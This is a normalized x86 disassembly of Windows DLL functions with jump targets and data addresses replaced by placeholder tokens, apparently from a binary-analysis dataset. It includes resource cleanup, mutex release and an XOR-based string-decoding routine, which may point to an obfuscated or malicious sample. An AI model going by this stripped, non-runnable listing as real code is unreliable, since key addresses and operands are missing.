pop ebp
retn
pop edi
pop ebx
mov eax 0x9
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0xc ]
push ecx
lea ebx [ ebp - 0x678 ]
call sub_1004e6c0
test eax eax
je r-xdata
pop edi
pop ebx
mov eax 0xb
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x60 ]
mov eax 0x2
call sub_100120a0
mov edx [ ebp - 0x68c ]
push 0x1
push edx
mov edx [ ebp - 0x690 ]
lea ecx [ ebp - 0x678 ]
lea eax [ ebp - 0x60 ]
call sub_10047450
add esp 0x8
test eax eax
je r-xdata
pop edi
pop ebx
mov eax 0xc
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
pop edi
pop ebx
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
pop edi
pop ebx
mov eax 0xd
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
sub_1004d3a0
push ebp
mov ebp esp
sub esp 0x10
mov eax [ ebp + 0x8 ]
push esi
push edi
mov edi [ ebp + 0xc ]
mov ecx [ edi ]
push ecx
lea edx [ ebp - 0x10 ]
push edx
mov [ ebp - 0x10 ] eax
call sub_10075c00
xor esi esi
add esp 0x8
cmp [ edi + 0xc ] esi
jbe r-xdata
lea eax [ edi + 0x8 ]
push eax
lea ecx [ ebp - 0x10 ]
push ecx
call sub_1005e540
lea edx [ ebp - 0x10 ]
push edi
push edx
call sub_10021f70
add esp 0x10
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov eax [ edi + 0x8 ]
mov ecx [ eax + esi * 4 ]
push ecx
lea edx [ ebp - 0x10 ]
push edx
call sub_10052500
inc esi
add esp 0x8
cmp esi [ edi + 0xc ]
jb r-xdata
sub_1004d400
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax [ ebp + 0x8 ]
sar eax 0x1
dec eax
pop ebp
retn
sub_1004d420
push ebp
mov ebp esp
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
mov [ ecx ] edx
mov edx [ eax + 0x8 ]
cmp [ edx + 0x15 ] 0x0
jne r-xdata
mov edx [ ecx + 0x4 ]
mov [ eax + 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x4 ]
cmp ecx [ edx + 0x4 ]
jne r-xdata
mov [ edx + 0x4 ] ecx
mov edx [ ecx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
mov [ edx + 0x4 ] eax
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
mov [ edx ] eax
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
mov [ edx + 0x8 ] eax
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
sub_1004d480
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax edx
push esi
lea esi [ eax + 0x1 ]
lea esp [ esp ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax esi
push eax
push edx
push r--data
call sub_10071980
add esp 0xc
pop esi
pop ebp
retn
sub_1004d4b0
push ebp
mov ebp esp
push 0xffffffff
push sub_1008501b
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
push 0x20
mov [ ebp - 0x10 ] 0x0
call sub_1001f84c
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor eax eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
push edx
mov ecx eax
call sub_10068a60
jmp r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x8
cmp [ rw-data ] 0x0
jne r-xdata
mov edi [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0xffffffff
mov [ esi ] eax
test edi edi
je r-xdata
mov eax [ rw-data ]
mov ecx [ esi ]
push eax
push edi
push ecx
call sub_1000673f
mov edx [ esi ]
mov [ edx + 0x10 ] 0x0
mov ecx [ esi ]
add esp 0xc
push r--data
add ecx 0x18
call sub_1004ed30
push 0x0
lea ecx [ ebp + 0x8 ]
call sub_10034e98
cmp [ rw-data ] 0x0
jne r-xdata
lea ecx [ ebp + 0x8 ]
call sub_10069747
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
mov [ rw-data ] eax
sub_1004d58a
push 0x4c
mov eax sub_10085e7f
call sub_1003fae8
mov edi [ ebp + 0x8 ]
and [ ebp - 0x30 ] 0x0
mov ebx [ ebp + 0xc ]
test edi edi
je r-xdata
xor eax eax
inc eax
call sub_1004642f
retn
cmp [ edi ] 0x0
jne r-xdata
push 0x10
call sub_1001f84c
mov esi eax
pop ecx
mov [ ebp - 0x34 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
lea eax [ ebp - 0x2c ]
push eax
mov ecx ebx
call sub_10042ed5
cmp [ eax + 0x14 ] 0x10
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x30 ] 0x1
jb r-xdata
test [ ebp - 0x30 ] 0x1
je r-xdata
and [ ebp - 0x30 ] 0xfffffffd
lea ecx [ ebp - 0x58 ]
call sub_1001c8b0
push eax
lea ecx [ ebp - 0x58 ]
call sub_100120f0
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x30 ] 0x3
mov [ esi ] r--data
call sub_100554b0
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov eax [ eax ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1002c8c0
push 0x2
pop eax
mov [ ebp - 0x4 ] eax
mov [ edi ] esi
test [ ebp - 0x30 ] al
je r-xdata
sub_1004d650
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
lea esi [ eax + eax * 2 ]
lea esi [ esi * 4 + r--data ]
xor cl cl
cmp [ esi + 0x4 ] 0x0
jbe r-xdata
mov ecx [ esi + 0x4 ]
mov edx [ ebp + 0xc ]
mov [ edx + ecx ] 0x0
pop esi
pop ebp
retn
push edi
mov edi [ ebp + 0xc ]
xor eax eax
nop
mov edx [ esi ]
mov dl [ edx + eax ]
xor dl [ esi + 0x8 ]
xor dl cl
inc cl
mov [ eax + edi ] dl
movzx eax cl
cmp eax [ esi + 0x4 ]
jb r-xdata
mov eax [ esi + 0x4 ]
mov [ edi + eax ] 0x0
pop edi
pop esi
pop ebp
retn
sub_1004d6c0
push esi
mov esi [ edi ]
test esi esi
je r-xdata
pop esi
retn
lea eax [ esi + 0x8 ]
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov [ edi ] 0x0
test esi esi
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
call [ SysFreeString@IAT ]
push esi
call sub_100187af
add esp 0x4
push eax
call sub_10034c90
add esp 0x4
sub_1004d707
push 0x14
push r--data
call sub_1007fb20
and [ ebp - 0x20 ] 0x0
cmp [ ebp + 0x8 ] 0x5
jbe r-xdata
call sub_10044649
mov esi eax
mov [ ebp - 0x1c ] esi
call sub_10007acd
or [ esi + 0x70 ] 0x10
and [ ebp - 0x4 ] 0x0
xor edi edi
inc edi
push edi
push 0xd8
call sub_10067d3a
pop ecx
pop ecx
mov ebx eax
mov [ ebp - 0x24 ] ebx
test ebx ebx
je r-xdata
call sub_1006299d
mov [ eax ] 0x16
call sub_100427ff
xor eax eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1004d876
mov eax [ ebp - 0x20 ]
push 0xc
call sub_10058c10
pop ecx
mov [ ebp - 0x4 ] edi
mov ecx [ esi + 0x6c ]
mov eax ebx
call sub_10080d8a
and [ ebp - 0x4 ] 0x0
call sub_1004d839
push [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov edx ebx
call sub_1008124f
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
je r-xdata
call sub_1007fb65
retn
push ebx
call sub_10070772
push ebx
call sub_10006356
pop ecx
pop ecx
cmp [ ebp + 0xc ] 0x0
je r-xdata
push 0xc
call sub_10058c10
pop ecx
mov [ ebp - 0x4 ] 0x2
lea edi [ esi + 0x6c ]
push ebx
push edi
call sub_1000150e
push ebx
call sub_10070772
add esp 0xc
test [ esi + 0x70 ] 0x2
jne r-xdata
push rw-data
push [ ebp + 0xc ]
call sub_1007fc10
pop ecx
pop ecx
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_1004d845
jmp r-xdata
test [ rw-data ] 0x1
jne r-xdata
mov [ rw-data ] edi
push [ edi ]
push rw-data
call sub_1000150e
pop ecx
pop ecx
mov eax [ rw-data ]
mov ecx [ eax + 0xbc ]
mov [ rw-data ] ecx
mov ecx [ eax + 0xc8 ]
mov [ rw-data ] ecx
mov eax [ eax + 0xac ]
mov [ rw-data ] eax
sub_1004d880
push ebp
mov ebp esp
push 0xffffffff
push sub_10086530
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ebx ecx
xor edi edi
push 0x10
mov [ ebp - 0x4 ] edi
call sub_1001f84c
add esp 0x4
cmp eax edi
je r-xdata
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
mov ecx 0x1
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov [ eax + 0xc ] ecx
mov edi eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4 ] edi
mov [ ebx ] eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edx [ esi + 0x4 ]
or eax 0xffffffff
[ edx ] eax
jne r-xdata
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
sub_1004d939
mov edi edi
push ebp
mov ebp esp
sub esp 0x90
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x90 ] eax
mov eax [ esi + 0x1c ]
push edi
mov [ ebp - 0x8c ] ecx
mov ecx [ esi + 0x18 ]
mov edi 0x2000
test eax eax
jg r-xdata
mov ebx ecx
mov [ ebp - 0x8 ] eax
test eax eax
jl r-xdata
jl r-xdata
mov [ ebp - 0x88 ] ebx
push 0x24
pop eax
jg r-xdata
test [ esi + 0x14 ] edi
jne r-xdata
test ecx ecx
jne r-xdata
fld [ ebp + 0x1c ]
fldz
fld [ ebp + 0x1c ]
fcom st1
fnstsw ax
test ah 0x5
jpe r-xdata
mov [ ebp - 0x88 ] eax
jmp r-xdata
cmp ebx eax
jbe r-xdata
push 0x6
pop ecx
xor eax eax
mov [ ebp - 0x79 ] 0x0
jmp r-xdata
mov [ ebp - 0x79 ] 0x1
fchs
mov eax [ ebp - 0x88 ]
mov ecx [ esi + 0x14 ]
cdq
sub ebx eax
sbb [ ebp - 0x8 ] edx
and [ ebp - 0x80 ] 0x0
and [ ebp - 0x84 ] 0x0
mov eax ecx
and eax 0x3000
cmp eax edi
jne r-xdata
fld [ r--data ]
push 0xa
fcom st1
mov edx 0x1388
pop edi
fnstsw ax
fld [ r--data ]
test ah 0x41
jpo r-xdata
cmp [ ebp - 0x80 ] edx
jae r-xdata
fstp st1
jmp r-xdata
fdiv st2
add [ ebp - 0x80 ] edi
fxch st1
fcom st2
fnstsw ax
test ah 0x41
jpo r-xdata
fxch st2
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
fxch st1
fstp st0
cmp [ ebp - 0x79 ] 0x0
fstp st1
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jl r-xdata
push ecx
push ecx
fstp [ esp ]
push [ ebp - 0x88 ]
lea eax [ ebp - 0xc ]
push ecx
push 0x4c
push eax
push [ ebp - 0x8c ]
call sub_1006c82b
add esp 0x10
push eax
lea eax [ ebp - 0x78 ]
push 0x6c
push eax
call sub_1005c1c5
push eax
push ebx
push [ ebp - 0x84 ]
lea eax [ ebp - 0x78 ]
push [ ebp - 0x80 ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp - 0x90 ]
push [ ebp - 0x8c ]
call sub_1004b2f2
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x90 ]
add esp 0x44
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10001e8b
leave
retn 0x1c
fchs
jmp r-xdata
jg r-xdata
fld [ r--data ]
fcomp st1
fnstsw ax
test ah 0x1
jne r-xdata
cmp ebx edi
jb r-xdata
cmp [ ebp - 0x84 ] edx
jae r-xdata
add ebx 0xfffffff6
fmul st1
adc [ ebp - 0x8 ] 0xffffffff
add [ ebp - 0x84 ] edi
cmp [ ebp - 0x8 ] 0x0
jg r-xdata
jge r-xdata
sub_1004dae3
mov edi edi
push ebp
mov ebp esp
add ecx 0x8
push ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100246ac
add esp 0x14
pop ebp
retn 0x10
sub_1004db10
push ebp
mov ebp esp
push 0xffffffff
push sub_10086b48
mov eax [ fs : 0x0 ]
push eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xa
mov eax [ ebx + 0x1c ]
test eax eax
je r-xdata
call [ CoUninitialize@IAT ]
cmp [ ebx + 0x12c ] 0x0
lea eax [ ebx + 0x12c ]
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
cmp [ ebx + 0x128 ] 0x0
lea edi [ ebx + 0x128 ]
je r-xdata
push eax
call sub_10021470
cmp [ ebx + 0x130 ] 0x0
lea esi [ ebx + 0x130 ]
je r-xdata
call sub_100077b0
cmp [ ebx + 0x138 ] 0x0
lea edi [ ebx + 0x138 ]
je r-xdata
call sub_10005d80
cmp [ ebx + 0x13c ] 0x0
lea edi [ ebx + 0x13c ]
je r-xdata
call sub_10028790
mov eax [ ebx + 0x20 ]
test eax eax
je r-xdata
call sub_10028790
mov eax [ ebx + 0x120 ]
mov esi [ LocalFree@IAT ]
test eax eax
je r-xdata
push eax
call [ ReleaseMutex@IAT ]
mov eax [ ebx + 0x20 ]
push eax
call [ CloseHandle@IAT ]
mov eax [ ebx + 0x124 ]
test eax eax
je r-xdata
push eax
call esi
mov [ ebx + 0x120 ] 0x0
mov esi 0x8
cmp [ ebx + 0x118 ] esi
jb r-xdata
push eax
call esi
mov [ ebx + 0x124 ] 0x0
mov edi 0x7
xor edx edx
mov [ ebx + 0x118 ] edi
mov [ ebx + 0x114 ] 0x0
mov [ ebx + 0x104 ] dx
cmp [ ebx + 0xfc ] esi
jb r-xdata
mov ecx [ ebx + 0x104 ]
push ecx
call sub_100187af
add esp 0x4
xor ecx ecx
mov [ ebx + 0xfc ] edi
mov [ ebx + 0xf8 ] 0x0
mov [ ebx + 0xe8 ] cx
cmp [ ebx + 0xe0 ] esi
jb r-xdata
mov eax [ ebx + 0xe8 ]
push eax
call sub_100187af
add esp 0x4
xor eax eax
mov [ ebx + 0xe0 ] edi
mov [ ebx + 0xdc ] 0x0
mov [ ebx + 0xcc ] ax
cmp [ ebx + 0xc4 ] esi
jb r-xdata
mov edx [ ebx + 0xcc ]
push edx
call sub_100187af
add esp 0x4
xor edx edx
mov [ ebx + 0xc4 ] edi
mov [ ebx + 0xc0 ] 0x0
mov [ ebx + 0xb0 ] dx
cmp [ ebx + 0xa8 ] esi
jb r-xdata
mov ecx [ ebx + 0xb0 ]
push ecx
call sub_100187af
add esp 0x4
xor ecx ecx
mov [ ebx + 0xa8 ] edi
mov [ ebx + 0xa4 ] 0x0
mov [ ebx + 0x94 ] cx
cmp [ ebx + 0x8c ] esi
jb r-xdata
mov eax [ ebx + 0x94 ]
push eax
call sub_100187af
add esp 0x4
xor eax eax
mov [ ebx + 0x8c ] edi
mov [ ebx + 0x88 ] 0x0
mov [ ebx + 0x78 ] ax
cmp [ ebx + 0x70 ] esi
jb r-xdata
mov edx [ ebx + 0x78 ]
push edx
call sub_100187af
add esp 0x4
xor edx edx
mov [ ebx + 0x70 ] edi
mov [ ebx + 0x6c ] 0x0
mov [ ebx + 0x5c ] dx
cmp [ ebx + 0x54 ] esi
jb r-xdata
mov ecx [ ebx + 0x5c ]
push ecx
call sub_100187af
add esp 0x4
xor ecx ecx
mov [ ebx + 0x54 ] edi
mov [ ebx + 0x50 ] 0x0
mov [ ebx + 0x40 ] cx
cmp [ ebx + 0x38 ] esi
jb r-xdata
mov eax [ ebx + 0x40 ]
push eax
call sub_100187af
add esp 0x4
xor eax eax
mov [ ebx + 0x38 ] edi
mov [ ebx + 0x34 ] 0x0
mov [ ebx + 0x24 ] ax
cmp [ ebx + 0x14 ] esi
jb r-xdata
mov edx [ ebx + 0x24 ]
push edx
call sub_100187af
add esp 0x4
xor edx edx
mov [ ebx + 0x14 ] edi
mov [ ebx + 0x10 ] 0x0
mov [ ebx ] dx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebx ]
push ecx
call sub_100187af
add esp 0x4
sub_1004ddc0
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push edi
mov edi ecx
xor ecx ecx
mov ebx edx
mov [ ebp - 0x28 ] ebx
mov [ esi + 0x4 ] ecx
mov [ esi + 0x8 ] ecx
mov [ esi ] r--data
mov [ esi + 0xc ] eax
cmp edi ecx
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax 0x130
call sub_10053240
mov eax ecx
cmp eax ecx
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax 0x49
call sub_10053240
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
mov eax esi
pop ebx
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push edi
call [ lstrlenW@IAT ]
lea ebx [ eax + eax ]
lea ecx [ ebx + 0x2 ]
push ecx
push 0x40
call [ LocalAlloc@IAT ]
push ebx
push edi
push eax
mov [ esi + 0x4 ] eax
call sub_1007f5d0
mov ebx [ ebp - 0x28 ]
add esp 0xc
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x4 ] 0x0
push ebx
call [ lstrlenW@IAT ]
lea edi [ eax + eax ]
lea edx [ edi + 0x2 ]
push edx
push 0x40
call [ LocalAlloc@IAT ]
push edi
push ebx
push eax
mov [ esi + 0x8 ] eax
call sub_1007f5d0
add esp 0xc
pop edi
mov eax esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x8 ] 0x0
test ebx ebx
je r-xdata
sub_1004dec0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x14 ]
mov ecx [ eax ]
mov [ eax + 0x20 ] edx
mov edx [ eax + 0x18 ]
mov [ eax + 0x4 ] ecx
mov ecx [ eax + 0x1c ]
mov [ eax + 0x24 ] edx
mov [ eax + 0x28 ] ecx
pop ebp
retn
sub_1004dee0
push ebp
mov ebp esp
push 0xffffffff
push sub_10089aec
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ebx ebx
xor edx edx
mov [ ebp - 0xbc ] 0x7
mov [ ebp - 0xc0 ] ebx
mov [ ebp - 0xd0 ] dx
push ecx
mov ecx [ ebp + 0xc ]
push eax
lea edx [ ebp - 0xd0 ]
mov [ ebp - 0x4 ] ebx
call sub_100153c0
mov esi eax
cmp esi ebx
je r-xdata
cmp [ ebp - 0xc0 ] ebx
jne r-xdata
lea edx [ ebp - 0x90 ]
lea eax [ ebx + 0x7a ]
call sub_10045930
lea eax [ ebp - 0x30 ]
push esi
push eax
call sub_1005f2b0
push eax
lea edx [ ebp - 0x90 ]
lea esi [ ebp - 0xb4 ]
mov [ ebp - 0x4 ] 0x1
call sub_1005bbc0
add esp 0xc
mov edx eax
lea ecx [ ebx + 0xf ]
mov [ ebp - 0x4 ] 0x2
call sub_100205a0
mov esi 0x8
cmp [ ebp - 0xa0 ] esi
jb r-xdata
push edi
lea ecx [ ebp - 0xd0 ]
call sub_1001c5e0
mov esi eax
cmp esi ebx
je r-xdata
mov esi 0x8
lea edx [ ebp - 0x3c ]
mov eax esi
call sub_10045930
xor edx edx
lea eax [ ebp - 0x3c ]
mov [ ebp - 0xb4 ] dx
mov [ ebp - 0xa0 ] 0x7
mov [ ebp - 0xa4 ] ebx
lea edx [ eax + 0x2 ]
jmp r-xdata
xor edx edx
mov [ ebp - 0xa0 ] 0x7
mov [ ebp - 0xa4 ] ebx
mov [ ebp - 0xb4 ] dx
cmp [ ebp - 0x1c ] esi
jb r-xdata
mov ecx [ ebp - 0xb4 ]
push ecx
call sub_100187af
add esp 0x4
cmp [ ebp - 0xbc ] 0x8
jb r-xdata
lea edx [ ebp - 0x98 ]
mov eax 0x13b
call sub_10045930
lea eax [ ebp - 0x30 ]
push esi
push eax
call sub_1005f2b0
push eax
lea edx [ ebp - 0x98 ]
lea esi [ ebp - 0xb4 ]
mov [ ebp - 0x4 ] 0x4
call sub_1005bbc0
add esp 0xc
mov edx eax
mov ecx 0xf
mov [ ebp - 0x4 ] 0x5
call sub_100205a0
mov esi 0x8
cmp [ ebp - 0xa0 ] esi
jb r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx bx
jne r-xdata
cmp [ ebp - 0xbc ] esi
jb r-xdata
mov eax [ ebp - 0x30 ]
push eax
call sub_100187af
add esp 0x4
xor eax eax
mov edx [ ebp - 0xd0 ]
push edx
call sub_100187af
add esp 0x4
xor edx edx
mov [ ebp - 0xa0 ] 0x7
mov [ ebp - 0xa4 ] ebx
mov [ ebp - 0xb4 ] dx
cmp [ ebp - 0x1c ] esi
jb r-xdata
mov ecx [ ebp - 0xb4 ]
push ecx
call sub_100187af
add esp 0x4
sub eax edx
sar eax 0x1
push eax
lea eax [ ebp - 0x3c ]
push eax
lea ecx [ ebp - 0xb4 ]
call sub_1005ddc0
lea edx [ ebp - 0xb4 ]
mov ecx 0xf
mov [ ebp - 0x4 ] 0x3
call sub_100205a0
cmp [ ebp - 0xa0 ] esi
jb r-xdata
mov eax 0x1
jmp r-xdata
mov ecx [ ebp - 0xd0 ]
push ecx
call sub_100187af
add esp 0x4
cmp [ ebp - 0xbc ] esi
jb r-xdata
mov eax [ ebp - 0x30 ]
push eax
call sub_100187af
add esp 0x4
cmp [ ebp - 0xbc ] esi
jb r-xdata
mov ecx [ ebp - 0xb4 ]
push ecx
call sub_100187af
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x8
mov eax 0x3
jmp r-xdata
mov ecx [ ebp - 0xd0 ]
push ecx
call sub_100187af
add esp 0x4
mov eax 0x2
jmp r-xdata
mov edx [ ebp - 0xd0 ]
push edx
call sub_100187af
add esp 0x4
sub_1004e190
push ebp
mov ebp esp
push 0xffffffff
push sub_10087de1
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor eax eax
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x4 ] 0x4
mov [ edi + 0x10 ] eax
mov ecx 0x7
mov [ edi + 0x14 ] ecx
xor edx edx
mov [ edi ] dx
mov [ edi + 0x30 ] ecx
mov [ edi + 0x2c ] eax
mov [ edi + 0x1c ] dx
mov [ edi + 0x50 ] ecx
mov [ edi + 0x4c ] eax
mov [ edi + 0x3c ] dx
mov [ edi + 0x6c ] ecx
mov [ edi + 0x68 ] eax
mov [ edi + 0x58 ] ax
cmp [ ebp + 0x1c ] 0x10
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x30 ] 0x1
jae r-xdata
mov ecx [ ebp + 0x18 ]
push eax
lea esi [ ebp - 0x2c ]
call sub_100704c0
add esp 0x4
push eax
lea ecx [ edi + 0x1c ]
mov [ ebp - 0x4 ] 0x5
call sub_100649e0
mov ebx 0x8
mov [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x18 ] ebx
jb r-xdata
lea eax [ ebp + 0x8 ]
mov eax [ ebp + 0x5c ]
mov esi 0x10
cmp [ ebp + 0x70 ] esi
jae r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_100187af
add esp 0x4
push eax
call [ StrToIntA@IAT ]
mov [ edi + 0x38 ] ax
mov eax [ ebp + 0x24 ]
cmp [ ebp + 0x38 ] esi
jae r-xdata
lea eax [ ebp + 0x5c ]
mov ecx [ ebp + 0x34 ]
push eax
lea esi [ ebp - 0x2c ]
call sub_100704c0
add esp 0x4
push eax
lea ecx [ edi + 0x3c ]
mov [ ebp - 0x4 ] 0x6
call sub_100649e0
mov [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x18 ] ebx
jb r-xdata
lea eax [ ebp + 0x24 ]
cmp [ ebp + 0x54 ] 0x10
mov eax [ ebp + 0x40 ]
jae r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_100187af
add esp 0x4
mov ecx [ ebp + 0x50 ]
push eax
lea esi [ ebp - 0x2c ]
call sub_100704c0
add esp 0x4
push eax
lea ecx [ edi + 0x58 ]
mov [ ebp - 0x4 ] 0x7
call sub_100649e0
cmp [ ebp - 0x18 ] ebx
jb r-xdata
lea eax [ ebp + 0x40 ]
cmp [ ebp + 0x1c ] 0x10
mov ecx [ ebp + 0x78 ]
mov [ edi + 0x78 ] ecx
mov [ edi + 0x7c ] 0x1
jb r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_100187af
add esp 0x4
xor esi esi
cmp [ ebp + 0x38 ] 0x10
mov ebx 0xf
mov [ ebp + 0x1c ] ebx
mov [ ebp + 0x18 ] esi
mov [ ebp + 0x8 ] 0x0
jb r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_100187af
add esp 0x4
cmp [ ebp + 0x54 ] 0x10
mov [ ebp + 0x38 ] ebx
mov [ ebp + 0x34 ] esi
mov [ ebp + 0x24 ] 0x0
jb r-xdata
mov eax [ ebp + 0x24 ]
push eax
call sub_100187af
add esp 0x4
cmp [ ebp + 0x70 ] 0x10
mov [ ebp + 0x54 ] ebx
mov [ ebp + 0x50 ] esi
mov [ ebp + 0x40 ] 0x0
jb r-xdata
mov ecx [ ebp + 0x40 ]
push ecx
call sub_100187af
add esp 0x4
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x5c ]
push edx
call sub_100187af
add esp 0x4
sub_1004e370
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp edi 0xffffffff
jne r-xdata
cmp edi 0x7ffffffe
jbe r-xdata
push r--data
call sub_1000831a
mov eax [ esi + 0x14 ]
cmp eax edi
jae r-xdata
push r--data
call sub_1000831a
test edi edi
jne r-xdata
mov eax [ esi + 0x10 ]
push eax
push edi
call sub_10041880
test edi edi
je r-xdata
mov edx [ ebp + 0xc ]
push edx
push edi
push 0x0
mov ecx esi
call sub_1004b2a0
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
mov [ esi + 0x10 ] edi
cmp eax 0x8
jb r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
mov eax esi
xor ecx ecx
mov [ eax + edi * 2 ] cx
mov eax [ esi ]
xor ecx ecx
mov [ eax + edi * 2 ] cx
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
mov eax esi
xor ecx ecx
pop edi
mov [ eax ] cx
pop esi
pop ebp
retn 0x8
mov eax [ esi ]
xor ecx ecx
mov [ eax ] cx
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
sub_1004e420
mov eax ecx
